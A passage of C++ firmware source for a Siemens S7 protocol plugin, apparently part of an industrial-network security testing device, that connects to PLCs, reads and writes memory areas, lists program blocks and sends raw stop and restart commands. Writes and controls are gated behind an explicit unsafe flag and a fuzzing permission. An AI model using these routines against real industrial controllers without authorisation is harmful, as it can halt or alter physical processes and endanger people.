    snprintf(dbuf, sizeof(dbuf), "\"pdu_size\":%u,\"max_jobs_calling\":%u,\"max_jobs_called\":%u,\"protection_level\":%u",
             (unsigned)dev_info.asdu_length, (unsigned)dev_info.max_jobs_calling, (unsigned)dev_info.max_jobs_called, (unsigned)dev_info.protection_level);
    ps += PSRAMUtils::createPSRAMString(dbuf);
    ps += PSRAMUtils::createPSRAMString("}");

    ps += PSRAMUtils::createPSRAMString("}");
    out_json = PSRAMUtils::fromPSRAMString(ps);

    // Consider the scan "successful" if ISO-on-TCP succeeded (even if SetupComm/SZL are restricted).
    return true;
}

static uint8_t s7_area_from_str(const char* s) {
    if (!s) return 0;
    if (strcmp(s, "db") == 0 || strcmp(s, "DB") == 0) return 0x84;
    if (strcmp(s, "i") == 0 || strcmp(s, "I") == 0 || strcmp(s, "inputs") == 0) return 0x81;
    if (strcmp(s, "q") == 0 || strcmp(s, "Q") == 0 || strcmp(s, "outputs") == 0) return 0x82;
    if (strcmp(s, "m") == 0 || strcmp(s, "M") == 0 || strcmp(s, "merkers") == 0) return 0x83;
    if (strcmp(s, "t") == 0 || strcmp(s, "T") == 0 || strcmp(s, "timers") == 0) return 0x1D;
    if (strcmp(s, "c") == 0 || strcmp(s, "C") == 0 || strcmp(s, "counters") == 0) return 0x1C;
    return 0;
}

// Best-effort ISO-on-TCP + S7 SetupComm. Returns a connected socket on success.
static bool s7_connect_setup_best_effort(S7Plugin* self,
                                        const std::string& ip,
                                        uint16_t port,
                                        uint32_t timeout_ms,
                                        uint16_t rack,
                                        uint16_t slot,
                                        int& out_sock,
                                        S7DeviceInfo& out_dev,
                                        uint16_t& out_src_tsap,
                                        uint16_t& out_dst_tsap,
                                        uint8_t& out_tpdu,
                                        bool* out_setup_comm_ok,
                                        psram_string& out_ifkey,
                                        psram_string& out_attempts_json,
                                        psram_string& out_error_json) {
    out_sock = -1;
    out_src_tsap = 0;
    out_dst_tsap = 0;
    out_tpdu = 0;
    if (out_setup_comm_ok) *out_setup_comm_ok = false;
    out_ifkey.clear();
    out_error_json.clear();

    sockaddr_in sa{};
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    if (::inet_aton(ip.c_str(), &sa.sin_addr) == 0) {
        out_error_json = PSRAMUtils::createPSRAMString("{\"error\":\"invalid_ip\"}");
        return false;
    }

    // Choose interface with target-aware policy:
    // 1) Prefer interface that has IP and same subnet of target.
    // 2) Fallback to ETH_DEF if up, then WIFI_STA_DEF.
    const char* ifkey = "ETH_DEF";
    esp_netif_t* netif = nullptr;
    esp_netif_ip_info_t ip_info{};
    esp_netif_ip_info_t eth_info{};
    esp_netif_ip_info_t wifi_info{};
    bool eth_ready = false;
    bool wifi_ready = false;

    esp_netif_t* eth = esp_netif_get_handle_from_ifkey("ETH_DEF");
    if (eth && esp_netif_get_ip_info(eth, &eth_info) == ESP_OK && eth_info.ip.addr != 0) {
        eth_ready = true;
    }
    esp_netif_t* wifi = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (wifi && esp_netif_get_ip_info(wifi, &wifi_info) == ESP_OK && wifi_info.ip.addr != 0) {
        wifi_ready = true;
    }

    auto same_subnet = [&](const esp_netif_ip_info_t& info) -> bool {
        if (info.netmask.addr == 0 || info.ip.addr == 0) return false;
        return ((sa.sin_addr.s_addr & info.netmask.addr) == (info.ip.addr & info.netmask.addr));
    };

    if (eth_ready && same_subnet(eth_info)) {
        netif = eth;
        ip_info = eth_info;
        ifkey = "ETH_DEF";
    } else if (wifi_ready && same_subnet(wifi_info)) {
        netif = wifi;
        ip_info = wifi_info;
        ifkey = "WIFI_STA_DEF";
    } else if (eth_ready) {
        netif = eth;
        ip_info = eth_info;
        ifkey = "ETH_DEF";
    } else if (wifi_ready) {
        netif = wifi;
        ip_info = wifi_info;
        ifkey = "WIFI_STA_DEF";
    }

    out_ifkey = PSRAMUtils::createPSRAMString(ifkey);
    if (!netif || ip_info.ip.addr == 0) {
        out_error_json = PSRAMUtils::createPSRAMString("{\"error\":\"netif_not_ready\",\"interface\":\"");
        out_error_json += PSRAMUtils::createPSRAMString(ifkey);
        out_error_json += PSRAMUtils::createPSRAMString("\"}");
        return false;
    }

    uint32_t io_timeout_ms = timeout_ms;
    if (io_timeout_ms < 300) io_timeout_ms = 300;
    if (io_timeout_ms > 15000) io_timeout_ms = 15000;

    auto make_sock = [&](int& sock_out) -> bool {
        sock_out = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock_out < 0) return false;
        configureTcpSocket(sock_out);
        struct timeval tv{.tv_sec = (int)(io_timeout_ms / 1000U), .tv_usec = (int)((io_timeout_ms % 1000U) * 1000U)};
        ::setsockopt(sock_out, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        ::setsockopt(sock_out, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        sockaddr_in local{};
        local.sin_family = AF_INET;
        local.sin_addr.s_addr = ip_info.ip.addr;
        local.sin_port = 0;
        (void)::bind(sock_out, (sockaddr*)&local, sizeof(local));
        return true;
    };

    auto try_cotp = [&](int sock, uint16_t src_tsap, uint16_t dst_tsap, uint8_t& out_tpdu_local) -> bool {
        uint8_t cr[] = {
            0x03, 0x00, 0x00, 0x16,              // TPKT
            0x11, 0xE0, 0x00, 0x00, 0x00, 0x01, 0x00,  // COTP CR
            0xC1, 0x02, 0x01, 0x00,              // src TSAP value at 13..14
            0xC2, 0x02, 0x01, 0x02,              // dst TSAP value at 17..18
            0xC0, 0x01, 0x0A                     // TPDU size 1024
        };
        cr[13] = (uint8_t)((src_tsap >> 8) & 0xFF);
        cr[14] = (uint8_t)(src_tsap & 0xFF);
        cr[17] = (uint8_t)((dst_tsap >> 8) & 0xFF);
        cr[18] = (uint8_t)(dst_tsap & 0xFF);
        cr[3] = (uint8_t)sizeof(cr);

        if (::send(sock, cr, sizeof(cr), 0) != (ssize_t)sizeof(cr)) return false;
        uint8_t rx[256];
        ssize_t n = ::recv(sock, rx, sizeof(rx), 0);
        if (n < 7 || rx[5] != 0xD0) return false;
        out_tpdu_local = 0;
        for (ssize_t i = 0; i + 2 < n; ++i) {
            if (rx[i] == 0xC0 && rx[i + 1] == 0x01) {
                out_tpdu_local = (uint8_t)rx[i + 2];
                break;
            }
        }
        return true;
    };

    struct TsapAttempt { uint16_t src; uint16_t dst; };
    TsapAttempt attempts[10] = {};
    size_t attempts_n = 0;

    auto add_attempt = [&](uint16_t src, uint16_t dst) {
        for (size_t i = 0; i < attempts_n; ++i) {
            if (attempts[i].src == src && attempts[i].dst == dst) return;
        }
        if (attempts_n < (sizeof(attempts) / sizeof(attempts[0]))) {
            attempts[attempts_n++] = {src, dst};
        }
    };

    // Canonical families first (requested):
    // rack=0 slot=0 => dst TSAP 0x0100
    // rack=0 slot=2 => dst TSAP 0x0102
    add_attempt(0x0100, 0x0100);
    add_attempt(0x0100, 0x0102);

    // Config-derived TSAP (best effort)
    const uint16_t cfg_dst = (uint16_t)(((rack + 1U) << 8) | (slot & 0xFFU));
    add_attempt(0x0100, cfg_dst);

    // Extra fallbacks
    add_attempt(0x0100, 0x0101);
    add_attempt(0x0200, 0x0200);

    out_attempts_json = PSRAMUtils::createPSRAMString("[");
    bool tcp_ok = false;
    bool cotp_ok = false;
    int sock = -1;
    for (size_t ai = 0; ai < attempts_n; ++ai) {
        if (!make_sock(sock)) {
            out_attempts_json += PSRAMUtils::createPSRAMString("]");
            out_error_json = PSRAMUtils::createPSRAMString("{\"error\":\"socket_failed\"}");
            return false;
        }
        if (!connect_with_timeout(sock, (sockaddr*)&sa, sizeof(sa), timeout_ms)) {
            ::close(sock); sock = -1;
            out_attempts_json += PSRAMUtils::createPSRAMString("]");
            char lip[16];
            snprintf(lip, sizeof(lip), IPSTR, IP2STR(&ip_info.ip));
            char ebuf[256];
            snprintf(ebuf, sizeof(ebuf),
                     "{\"error\":\"connection_timeout\",\"interface\":\"%s\",\"local_ip\":\"%s\",\"target\":\"%s\",\"port\":%u}",
                     ifkey, lip, ip.c_str(), (unsigned)port);
            out_error_json = PSRAMUtils::createPSRAMString(ebuf);
            return false;
        }
        tcp_ok = true;
        uint8_t tpdu = 0;
        bool ok = try_cotp(sock, attempts[ai].src, attempts[ai].dst, tpdu);
        auto tpdu_bytes = [](uint8_t tpdu_code) -> int {
            if (tpdu_code < 7 || tpdu_code > 16) return -1;
            return (int)(1U << tpdu_code);
        };
        const int tb = tpdu_bytes(tpdu);
        char tb_buf[16];
        if (tb > 0) snprintf(tb_buf, sizeof(tb_buf), "%d", tb);

        char one[240];
        snprintf(one, sizeof(one),
                 "%s{\"source_tsap_hex\":\"%04X\",\"destination_tsap_hex\":\"%04X\",\"ok\":%s,"
                 "\"tpdu_size_code_hex\":\"%02X\"%s%s}",
                 (ai ? "," : ""),
                 (unsigned)attempts[ai].src, (unsigned)attempts[ai].dst,
                 ok ? "true" : "false", (unsigned)tpdu,
                 (tb > 0 ? ",\"tpdu_size_bytes\":" : ""),
                 (tb > 0 ? tb_buf : ""));
        out_attempts_json += PSRAMUtils::createPSRAMString(one);

        if (!ok) {
            ::close(sock); sock = -1;
            continue;
        }
        cotp_ok = true;
        out_src_tsap = attempts[ai].src;
        out_dst_tsap = attempts[ai].dst;
        out_tpdu = tpdu;
        break;
    }
    out_attempts_json += PSRAMUtils::createPSRAMString("]");

    if (!tcp_ok) {
        out_error_json = PSRAMUtils::createPSRAMString("{\"error\":\"connect_failed\"}");
        return false;
    }
    if (!cotp_ok) {
        PSRAMAllocator<char> alloc;
        psram_string ps(alloc);
        ps.reserve(256);
        ps += PSRAMUtils::createPSRAMString("{\"error\":\"cotp_connection_confirm_failed\",\"connection_attempts\":");
        ps += out_attempts_json;
        ps += PSRAMUtils::createPSRAMString("}");
        out_error_json = ps;
        return false;
    }

    // Setup communication (best effort)
    out_dev = S7DeviceInfo{};
    out_dev.is_online = true;
    bool setup_ok = s7_send_setup_comm_free(sock, out_dev);
    out_dev.setup_comm_success = setup_ok;
    if (out_setup_comm_ok) *out_setup_comm_ok = setup_ok;
    out_sock = sock;
    return true;
}

static bool s7_read_var_bytes(S7Plugin* self,
                              int sock,
                              uint16_t pdu_ref,
                              uint8_t area,
                              uint16_t db_number,
                              uint32_t start_byte,
                              uint16_t size_bytes,
                              std::vector<uint8_t>& out_data,
                              psram_string& out_err) {
    (void)self;
    out_data.clear();
    out_err.clear();
    if (size_bytes == 0 || size_bytes > 1024) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"invalid_size\"}");
        return false;
    }

    // Parameters: FUNC + items + S7ANY
    uint8_t params[2 + 12] = {0};
    params[0] = S7::FUNC_READ_VAR;
    params[1] = 0x01; // item count
    params[2] = 0x12; params[3] = 0x0A; params[4] = 0x10;
    params[5] = 0x02; // variable type: BYTE
    wr16be_free(params + 6, size_bytes);      // elements
    wr16be_free(params + 8, db_number);       // DB number
    params[10] = area;                   // area
    const uint32_t addr_bits = start_byte * 8U;
    params[11] = (uint8_t)((addr_bits >> 16) & 0xFF);
    params[12] = (uint8_t)((addr_bits >> 8) & 0xFF);
    params[13] = (uint8_t)(addr_bits & 0xFF);

    // Build full PDU
    uint8_t pkt[7 + 10 + sizeof(params)] = {0};
    size_t off = 0;
    // TPKT
    pkt[off++] = 0x03; pkt[off++] = 0x00;
    // len placeholder
    off += 2;
    // COTP DT
    pkt[off++] = 0x02; pkt[off++] = 0xF0; pkt[off++] = 0x80;
    // S7 header
    pkt[off++] = 0x32;
    pkt[off++] = S7::PDU_TYPE_JOB;
    pkt[off++] = 0x00; pkt[off++] = 0x00;
    wr16be_free(pkt + off, pdu_ref); off += 2;
    wr16be_free(pkt + off, (uint16_t)sizeof(params)); off += 2;
    wr16be_free(pkt + off, 0); off += 2; // data len
    memcpy(pkt + off, params, sizeof(params)); off += sizeof(params);
    wr16be_free(pkt + 2, (uint16_t)off);

    if (::send(sock, pkt, off, 0) != (ssize_t)off) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"send_failed\"}");
        return false;
    }
    uint8_t rx[2048];
    ssize_t n = ::recv(sock, rx, sizeof(rx), 0);
    if (n <= 0) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"recv_failed\"}");
        return false;
    }

    size_t s7_len = 0;
    const uint8_t* s7 = locate_s7_pdu_free(rx, (size_t)n, s7_len);
    if (!s7 || s7_len < 12) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"no_s7_pdu\"}");
        return false;
    }
    if (s7[1] != S7::PDU_TYPE_ACK_DATA) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"unexpected_rosctr\"}");
        return false;
    }
    uint16_t par_len = rd16be_free(s7 + 6);
    uint16_t dat_len = rd16be_free(s7 + 8);
    if (10U + par_len + dat_len > s7_len) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"length_mismatch\"}");
        return false;
    }
    const uint8_t* data = s7 + 10 + par_len;
    if (dat_len < 4) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"no_data\"}");
        return false;
    }
    uint8_t ret = data[0];
    uint16_t bitlen = rd16be_free(data + 2);
    size_t bytes = (bitlen + 7U) / 8U;
    if (ret != 0xFF) {
        char e[64]; snprintf(e, sizeof(e), "{\"error\":\"read_failed\",\"return_code\":%u}", (unsigned)ret);
        out_err = PSRAMUtils::createPSRAMString(e);
        return false;
    }
    if (4U + bytes > (size_t)dat_len) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"data_truncated\"}");
        return false;
    }
    out_data.assign(data + 4, data + 4 + bytes);
    return true;
}

static bool s7_write_var_bytes(S7Plugin* self,
                               int sock,
                               uint16_t pdu_ref,
                               uint8_t area,
                               uint16_t db_number,
                               uint32_t start_byte,
                               const std::vector<uint8_t>& data_bytes,
                               psram_string& out_err) {
    (void)self;
    out_err.clear();
    if (data_bytes.empty() || data_bytes.size() > 1024) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"invalid_size\"}");
        return false;
    }

    // Parameters: FUNC + items + S7ANY
    uint8_t params[2 + 12] = {0};
    params[0] = S7::FUNC_WRITE_VAR;
    params[1] = 0x01;
    params[2] = 0x12; params[3] = 0x0A; params[4] = 0x10;
    params[5] = 0x02; // BYTE
    wr16be_free(params + 6, (uint16_t)data_bytes.size());
    wr16be_free(params + 8, db_number);
    params[10] = area;
    const uint32_t addr_bits = start_byte * 8U;
    params[11] = (uint8_t)((addr_bits >> 16) & 0xFF);
    params[12] = (uint8_t)((addr_bits >> 8) & 0xFF);
    params[13] = (uint8_t)(addr_bits & 0xFF);

    // Data item header: [return_code=0x00][transport_size=0x04][len_bits=uint16][data...][pad?]
    const uint16_t bitlen = (uint16_t)(data_bytes.size() * 8U);
    const bool pad = (data_bytes.size() & 1U) != 0;
    const size_t data_item_len = 4U + data_bytes.size() + (pad ? 1U : 0U);

    const size_t total_len = 7U + 10U + sizeof(params) + data_item_len;
    if (total_len > 2048) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"too_large\"}");
        return false;
    }
    std::vector<uint8_t> pkt(total_len);
    size_t off = 0;
    pkt[off++] = 0x03; pkt[off++] = 0x00;
    off += 2;
    pkt[off++] = 0x02; pkt[off++] = 0xF0; pkt[off++] = 0x80;
    pkt[off++] = 0x32;
    pkt[off++] = S7::PDU_TYPE_JOB;
    pkt[off++] = 0x00; pkt[off++] = 0x00;
    wr16be_free(pkt.data() + off, pdu_ref); off += 2;
    wr16be_free(pkt.data() + off, (uint16_t)sizeof(params)); off += 2;
    wr16be_free(pkt.data() + off, (uint16_t)data_item_len); off += 2;
    memcpy(pkt.data() + off, params, sizeof(params)); off += sizeof(params);

    pkt[off++] = 0x00;
    pkt[off++] = 0x04; // transport size: byte/word/dword payload (we write bytes)
    wr16be_free(pkt.data() + off, bitlen); off += 2;
    memcpy(pkt.data() + off, data_bytes.data(), data_bytes.size()); off += data_bytes.size();
    if (pad) pkt[off++] = 0x00;

    wr16be_free(pkt.data() + 2, (uint16_t)off);

    if (::send(sock, pkt.data(), off, 0) != (ssize_t)off) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"send_failed\"}");
        return false;
    }
    uint8_t rx[1024];
    ssize_t n = ::recv(sock, rx, sizeof(rx), 0);
    if (n <= 0) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"recv_failed\"}");
        return false;
    }

    size_t s7_len = 0;
    const uint8_t* s7 = locate_s7_pdu_free(rx, (size_t)n, s7_len);
    if (!s7 || s7_len < 12) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"no_s7_pdu\"}");
        return false;
    }
    if (s7[1] != S7::PDU_TYPE_ACK_DATA) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"unexpected_rosctr\"}");
        return false;
    }

    // Best-effort: check data return code if present.
    uint16_t par_len = rd16be_free(s7 + 6);
    uint16_t dat_len = rd16be_free(s7 + 8);
    if (10U + par_len + dat_len <= s7_len && dat_len >= 1) {
        const uint8_t* data = s7 + 10 + par_len;
        if (data[0] != 0xFF) {
            char e[64]; snprintf(e, sizeof(e), "{\"error\":\"write_failed\",\"return_code\":%u}", (unsigned)data[0]);
            out_err = PSRAMUtils::createPSRAMString(e);
            return false;
        }
    }
    return true;
}

static const char* s7_block_type_name(uint8_t t) {
    switch (t) {
        case 0x38: return "OB";
        case 0x41: return "DB";
        case 0x42: return "SDB";
        case 0x43: return "FC";
        case 0x44: return "SFC";
        case 0x45: return "FB";
        case 0x46: return "SFB";
        default: return "UNKNOWN";
    }
}

static bool s7_userdata_exchange(int sock,
                                 uint16_t pdu_ref,
                                 const uint8_t* params,
                                 uint16_t params_len,
                                 const uint8_t* data,
                                 uint16_t data_len,
                                 std::vector<uint8_t>& out_rx,
                                 const uint32_t rx_cap,
                                 psram_string& out_err) {
    out_rx.clear();
    out_err.clear();
    if (!params || params_len == 0) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"invalid_params\"}");
        return false;
    }
    if (params_len > 512 || data_len > 2048) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"payload_too_large\"}");
        return false;
    }

    const size_t total_len = 7U + 10U + (size_t)params_len + (size_t)data_len;
    if (total_len > 4096) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"packet_too_large\"}");
        return false;
    }

    std::vector<uint8_t> pkt(total_len);
    size_t off = 0;
    pkt[off++] = 0x03; pkt[off++] = 0x00;
    off += 2; // length later
    pkt[off++] = 0x02; pkt[off++] = 0xF0; pkt[off++] = 0x80; // COTP DT

    // S7 header (10 bytes)
    pkt[off++] = 0x32;
    pkt[off++] = S7::PDU_TYPE_USERDATA;
    pkt[off++] = 0x00; pkt[off++] = 0x00;
    wr16be_free(pkt.data() + off, pdu_ref); off += 2;
    wr16be_free(pkt.data() + off, params_len); off += 2;
    wr16be_free(pkt.data() + off, data_len); off += 2;

    memcpy(pkt.data() + off, params, params_len); off += params_len;
    if (data_len && data) {
        memcpy(pkt.data() + off, data, data_len); off += data_len;
    }

    wr16be_free(pkt.data() + 2, (uint16_t)off);
    if (::send(sock, pkt.data(), off, 0) != (ssize_t)off) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"send_failed\"}");
        return false;
    }

    out_rx.resize(rx_cap);
    ssize_t n = ::recv(sock, out_rx.data(), out_rx.size(), 0);
    if (n <= 0) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"recv_failed\"}");
        out_rx.clear();
        return false;
    }
    out_rx.resize((size_t)n);
    return true;
}

struct S7BlockCountEntry {
    uint8_t type = 0;
    uint16_t count = 0;
};

static bool s7_list_blocks_counts(int sock,
                                  S7BlockCountEntry out_entries[7],
                                  psram_string& out_err) {
    if (!out_entries) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"invalid_output\"}");
        return false;
    }
    for (int i = 0; i < 7; ++i) out_entries[i] = S7BlockCountEntry{};

    // Snap7-compatible "List blocks" (non-invasive).
    // Params: 00 01 12 04 11 43 01 00
    // Data:   0A 00 00 00
    const uint8_t params[] = {0x00,0x01,0x12,0x04,0x11,0x43,0x01,0x00};
    const uint8_t data[]   = {0x0A,0x00,0x00,0x00};
    std::vector<uint8_t> rx;
    if (!s7_userdata_exchange(sock, /*pdu_ref*/0x0200, params, sizeof(params), data, sizeof(data),
                              rx, /*rx_cap*/1024, out_err)) {
        return false;
    }

    size_t s7_len = 0;
    const uint8_t* s7 = locate_s7_pdu_free(rx.data(), rx.size(), s7_len);
    if (!s7 || s7_len < 12) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"no_s7_pdu\"}");
        return false;
    }
    if (s7[1] != S7::PDU_TYPE_USERDATA) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"unexpected_rosctr\"}");
        return false;
    }
    const uint16_t par_len = rd16be_free(s7 + 6);
    const uint16_t dat_len = rd16be_free(s7 + 8);
    if ((size_t)10 + (size_t)par_len + (size_t)dat_len > s7_len || dat_len < 32) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"invalid_lengths\"}");
        return false;
    }
    const uint8_t* d = s7 + 10 + par_len;
    if (d[0] != 0xFF) {
        char e[96]; snprintf(e, sizeof(e), "{\"error\":\"list_blocks_failed\",\"return_code\":%u}", (unsigned)d[0]);
        out_err = PSRAMUtils::createPSRAMString(e);
        return false;
    }
    const uint16_t payload_len = rd16be_free(d + 2);
    if (payload_len != 28 || dat_len < (uint16_t)(4 + payload_len)) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"unexpected_payload_len\"}");
        return false;
    }
    const uint8_t* p = d + 4;
    for (int i = 0; i < 7; ++i) {
        out_entries[i].type = p[i * 4 + 0];
        out_entries[i].count = (uint16_t)((p[i * 4 + 1] << 8) | (uint16_t)p[i * 4 + 2]);
    }
    return true;
}

struct S7BlockItemEntry {
    uint16_t number = 0;
    uint8_t lang = 0;
    uint8_t flags = 0;
};

static uint8_t s7_block_type_from_str(const char* s) {
    if (!s) return 0;
    if (strcmp(s, "OB") == 0 || strcmp(s, "ob") == 0) return 0x38;
    if (strcmp(s, "DB") == 0 || strcmp(s, "db") == 0) return 0x41;
    if (strcmp(s, "SDB") == 0 || strcmp(s, "sdb") == 0) return 0x42;
    if (strcmp(s, "FC") == 0 || strcmp(s, "fc") == 0) return 0x43;
    if (strcmp(s, "SFC") == 0 || strcmp(s, "sfc") == 0) return 0x44;
    if (strcmp(s, "FB") == 0 || strcmp(s, "fb") == 0) return 0x45;
    if (strcmp(s, "SFB") == 0 || strcmp(s, "sfb") == 0) return 0x46;
    return 0;
}

static bool s7_list_blocks_of_type(int sock,
                                   uint8_t block_type,
                                   std::vector<S7BlockItemEntry>& out_items,
                                   psram_string& out_err) {
    out_items.clear();
    out_err.clear();
    if (!block_type) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"invalid_block_type\"}");
        return false;
    }
    const uint8_t params[] = {0x00,0x01,0x12,0x04,0x11,0x43,0x02,0x00};
    const uint8_t data[]   = {0x0A,0x00,0x00,0x00,0x30,block_type,0x00,0x00};
    std::vector<uint8_t> rx;
    if (!s7_userdata_exchange(sock, /*pdu_ref*/0x0201, params, sizeof(params), data, sizeof(data),
                              rx, /*rx_cap*/2048, out_err)) {
        return false;
    }
    size_t s7_len = 0;
    const uint8_t* s7 = locate_s7_pdu_free(rx.data(), rx.size(), s7_len);
    if (!s7 || s7_len < 12) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"no_s7_pdu\"}");
        return false;
    }
    if (s7[1] != S7::PDU_TYPE_USERDATA) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"unexpected_rosctr\"}");
        return false;
    }
    const uint16_t par_len = rd16be_free(s7 + 6);
    const uint16_t dat_len = rd16be_free(s7 + 8);
    if ((size_t)10 + (size_t)par_len + (size_t)dat_len > s7_len || dat_len < 6) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"invalid_lengths\"}");
        return false;
    }
    const uint8_t* d = s7 + 10 + par_len;
    if (d[0] != 0xFF) {
        char e[96]; snprintf(e, sizeof(e), "{\"error\":\"list_blocks_of_type_failed\",\"return_code\":%u}", (unsigned)d[0]);
        out_err = PSRAMUtils::createPSRAMString(e);
        return false;
    }
    const uint16_t blocks_count = (uint16_t)((d[4] << 8) | (uint16_t)d[5]);
    const size_t need = 6U + (size_t)blocks_count * 4U;
    if (dat_len < need) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"truncated_blocks_list\"}");
        return false;
    }
    out_items.reserve(blocks_count);
    const uint8_t* p = d + 6;
    for (uint16_t i = 0; i < blocks_count; ++i) {
        S7BlockItemEntry it;
        it.number = (uint16_t)((p[i * 4 + 0] << 8) | (uint16_t)p[i * 4 + 1]);
        it.lang = p[i * 4 + 2];
        it.flags = p[i * 4 + 3];
        out_items.push_back(it);
    }
    return true;
}

static bool s7_plc_control(int sock,
                           uint16_t pdu_ref,
                           uint8_t mode_ch,
                           uint8_t func_code,
                           psram_string& out_err) {
    out_err.clear();
    // Params: 00 01 12 04 11 41 01 00  (PLC control)
    const uint8_t params[] = {0x00,0x01,0x12,0x04,0x11,0x41,0x01,0x00};
    // Data: FF 09 00 08 + "P_PR" + "OG" + mode + func
    // (mode is 0x00 for STOP, or 'H'/'C' for hot/cold start with func 0x28)
    const uint8_t data[] = {
        0xFF,0x09,0x00,0x08,
        0x50,0x5F,0x50,0x52, // "P_PR"
        0x4F,0x47,           // "OG"
        0x00,                // mode placeholder
        0x00                 // func placeholder
    };
    uint8_t d[sizeof(data)];
    memcpy(d, data, sizeof(d));
    d[10] = mode_ch;
    d[11] = func_code;

    std::vector<uint8_t> rx;
    if (!s7_userdata_exchange(sock, pdu_ref, params, sizeof(params), d, sizeof(d),
                              rx, /*rx_cap*/1024, out_err)) {
        return false;
    }

    size_t s7_len = 0;
    const uint8_t* s7 = locate_s7_pdu_free(rx.data(), rx.size(), s7_len);
    if (!s7 || s7_len < 12) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"no_s7_pdu\"}");
        return false;
    }
    if (s7[1] != S7::PDU_TYPE_USERDATA) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"unexpected_rosctr\"}");
        return false;
    }
    const uint16_t par_len = rd16be_free(s7 + 6);
    const uint16_t dat_len = rd16be_free(s7 + 8);
    if ((size_t)10 + (size_t)par_len + (size_t)dat_len > s7_len || dat_len < 1) {
        out_err = PSRAMUtils::createPSRAMString("{\"error\":\"invalid_lengths\"}");
        return false;
    }
    const uint8_t* dd = s7 + 10 + par_len;
    if (dd[0] != 0xFF) {
        char e[96]; snprintf(e, sizeof(e), "{\"error\":\"plc_control_failed\",\"return_code\":%u}", (unsigned)dd[0]);
        out_err = PSRAMUtils::createPSRAMString(e);
        return false;
    }
    return true;
}

bool S7Plugin::clientOpsPSRAM(const psram_string& request_json, psram_string& out_json) {
    out_json.clear();
    if (request_json.empty()) {
        out_json = PSRAMUtils::createPSRAMString("{\"error\":\"empty_request\"}");
        return false;
    }

    cJSON* root = PSRAMJsonParser::parseInPSRAM(request_json.c_str(), request_json.size());
    if (!root || !cJSON_IsObject(root)) {
        if (root) cJSON_Delete(root);
        out_json = PSRAMUtils::createPSRAMString("{\"error\":\"invalid_json\"}");
        return false;
    }

    const char* op = nullptr;
    const char* target = nullptr;
    uint32_t timeout_ms = 3000;
    uint16_t rack = 0, slot = 2;

    if (auto v = cJSON_GetObjectItem(root, "op"); v && cJSON_IsString(v) && v->valuestring) op = v->valuestring;
    if (auto v = cJSON_GetObjectItem(root, "target"); v && cJSON_IsString(v) && v->valuestring) target = v->valuestring;
    if (auto v = cJSON_GetObjectItem(root, "timeout_ms"); v && cJSON_IsNumber(v)) {
        double d = v->valuedouble;
        if (d < 200) d = 200;
        if (d > 15000) d = 15000;
        timeout_ms = (uint32_t)d;
    }

    // Defaults from protocol config if available.
    if (cfg_) {
        auto m = cfg_->getProtocolConfig(ProtocolType::S7_COMM);
        auto it_r = m.find(PSRAMUtils::createPSRAMString("rack"));
        auto it_s = m.find(PSRAMUtils::createPSRAMString("slot"));
        if (it_r != m.end()) rack = (uint16_t)atoi(it_r->second.c_str());
        if (it_s != m.end()) slot = (uint16_t)atoi(it_s->second.c_str());
    }
    if (auto v = cJSON_GetObjectItem(root, "rack"); v && cJSON_IsNumber(v)) rack = (uint16_t)v->valueint;
    if (auto v = cJSON_GetObjectItem(root, "slot"); v && cJSON_IsNumber(v)) slot = (uint16_t)v->valueint;

    if (!op || !target || target[0] == '\0') {
        cJSON_Delete(root);
        out_json = PSRAMUtils::createPSRAMString("{\"error\":\"missing_fields\",\"required\":[\"op\",\"target\"]}");
        return false;
    }

    // Parse target
    std::string ip;
    uint16_t port = 102;
    if (!splitTarget(target, ip, port)) {
        cJSON_Delete(root);
        out_json = PSRAMUtils::createPSRAMString("{\"error\":\"invalid_target\"}");
        return false;
    }

    const bool op_is_write =
        (strcmp(op, "write_db") == 0) || (strcmp(op, "write_area") == 0);
    const bool op_is_control =
        (strcmp(op, "plc_stop") == 0) || (strcmp(op, "plc_start") == 0) || (strcmp(op, "plc_cold_restart") == 0) ||
        (strcmp(op, "upload_block") == 0) || (strcmp(op, "download_block") == 0);

    bool unsafe = false;
    if (auto v = cJSON_GetObjectItem(root, "unsafe"); v && cJSON_IsBool(v)) unsafe = cJSON_IsTrue(v);

    // Gate state-changing operations behind SecurityManager "fuzzing_allowed_effective" and explicit unsafe=true.
    if ((op_is_write || op_is_control) && (!unsafe || !sec_ || !sec_->isFuzzingAllowed())) {
        PSRAMAllocator<char> alloc;
        psram_string rep(alloc);
        rep.reserve(256);
        rep += PSRAMUtils::createPSRAMString("{\"op\":\"");
        rep += PSRAMUtils::createPSRAMString(op);
